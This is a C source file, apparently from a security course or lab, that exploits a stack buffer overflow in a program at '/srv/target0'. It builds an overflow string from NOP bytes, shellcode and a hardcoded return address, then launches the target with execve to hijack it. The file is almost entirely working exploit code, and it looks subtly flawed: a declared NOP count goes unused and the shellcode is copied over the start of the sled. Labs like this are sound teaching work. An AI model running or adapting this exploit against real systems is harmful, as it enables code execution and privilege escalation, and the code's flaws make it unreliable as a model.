#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <shellcode.h>

#define TARGET "/srv/target0"

const int OFFSET = 408;
const int NOP_COUNT = 200;
const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
const char* RETURN_ADDRESS = 0xffffdb2c;

int main(void)
{
  char *args[3];
  char *env[1];

  // Create the exploit string
  char buf[OFFSET + 1];

  // Add the NOP sled
  memset(buf, '\x90', sizeof(buf));

  buf[OFFSET] = 0;

  // Add the shellcode
  memcpy(buf, shellcode, SHELLCODE_LENGTH);

  *(unsigned int*)(buf + OFFSET - 4) = RETURN_ADDRESS;

  // Set up the arguments for execve
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  // Execute the target program with the exploit string
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}